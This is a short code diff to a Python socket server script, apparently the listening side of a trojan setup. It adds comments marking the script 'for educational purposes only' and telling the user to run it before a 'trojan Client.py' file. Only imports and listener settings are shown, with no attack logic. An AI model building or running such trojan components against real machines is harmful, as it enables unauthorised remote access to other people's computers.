@@ -2,7 +2,8 @@ import socket
 import tqdm
 import os
 
-
+#FOR EDUCATIONAL PURPOSES ONLY
+#Run this before the trojan Client.py file
 ServerHost = "0.0.0.0"
 ServerPort = 8000
 BufferSize = 4096
